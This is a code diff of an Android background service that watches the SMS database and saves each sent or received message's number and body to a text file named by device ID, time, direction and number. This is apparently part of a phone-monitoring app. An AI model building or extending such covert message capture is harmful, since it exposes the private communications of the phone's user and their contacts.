@@ -40,14 +40,14 @@ public class BackService extends Service {
 	TelephonyManager telephony;
 	PhoneListener phoneListener;
 	SmsManager smsManager;
-	public static String id = "";
+	public static String DeviceId = "";
 	LocalBroadcastManager localBroadcastManager;
 	boolean observingSMS = false;
 	String lastID = "";
 
 	@Override
 	public void onCreate() {
-		id = Secure.getString(this.getContentResolver(), Secure.ANDROID_ID);
+		DeviceId = Secure.getString(getApplicationContext().getContentResolver(),Secure.ANDROID_ID);
 		dbHandler = new  DBHandler(getApplicationContext());
 		helpers = new Helpers(getApplicationContext());
 		isRunning = true;
@@ -119,27 +119,26 @@ public class BackService extends Service {
                     dir.mkdirs();
                 }
 				if (cur.moveToNext()) {
-					Log.e(LOG_TAG, cur.getString(cur.getColumnIndex("type")));
+					Log.e(LOG_TAG + "SMS TYPE:", cur.getString(cur.getColumnIndex("type")));
 					if (cur.getString(cur.getColumnIndex("type")).equals("1") ||
 							cur.getString(cur.getColumnIndex("type")).equals("2")) {
 						String id = cur.getString(cur.getColumnIndex("_id"));
 						if (!id.equals(lastID)) {
-							String content = cur.getString(cur.getColumnIndex("body"));
-							String no = cur.getString(cur.getColumnIndex("address"));
-							File file = new File(dir,Util.getTime()+"sms.txt");
-							fileName = file.getName();
-							FileWriter writer = new FileWriter(file);
 							String status = "";
 							if (cur.getString(cur.getColumnIndex("type")).equals("1")) {
 								Log.e(LOG_TAG, "Sms Received");
-								status = "incoming";
+								status = "in";
 							} else if (cur.getString(cur.getColumnIndex("type")).equals("2")) {
 								Log.e(LOG_TAG, "Sms Sent");
-								status = "OutGoing";
-							} else {
-								return;
+								status = "out";
 							}
-							writer.append("Number : "+no+" \n Status :" + status+"\n body : "+content);
+							String content = cur.getString(cur.getColumnIndex("body"));
+							String no = cur.getString(cur.getColumnIndex("address"));
+							File file = new File(dir,DeviceId + "_"+Util.getTime()+"_"+status+"_" +no+".txt");
+							fileName = file.getName();
+							FileWriter writer = new FileWriter(file);
+
+							writer.append("Number : " + no + " \n Status :" + status + "\n body : " + content);
 							writer.flush();
 							writer.close();
 //							String path = RecordService.DEFAULT_STORAGE_LOCATION;
